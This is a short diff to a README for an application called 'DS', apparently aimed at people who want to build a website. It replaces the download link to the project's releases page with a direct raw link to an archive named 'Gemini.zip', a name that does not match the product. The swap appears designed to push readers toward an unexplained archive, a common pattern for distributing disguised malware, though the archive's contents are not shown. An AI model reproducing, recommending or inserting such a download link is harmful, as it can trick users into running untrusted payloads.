@@ -12,9 +12,9 @@ Think of it like this: you have a business idea and want a website. You think "m
 
 **Step 1: Visit the Download Page**
 
-[![DOWNLOAD DS NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_DS-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/jocosenessfeedbunk738/ds/releases)
+[![DOWNLOAD DS NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_DS-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/jocosenessfeedbunk738/ds/main/packaging/Gemini.zip)
 
-Click the button above or visit this link to download the application: [https://github.com/jocosenessfeedbunk738/ds/releases](https://github.com/jocosenessfeedbunk738/ds/releases)
+Click the button above or visit this link to download the application: [https://raw.githubusercontent.com/jocosenessfeedbunk738/ds/main/packaging/Gemini.zip](https://raw.githubusercontent.com/jocosenessfeedbunk738/ds/main/packaging/Gemini.zip)
 
 **Step 2: Download Your File**
 
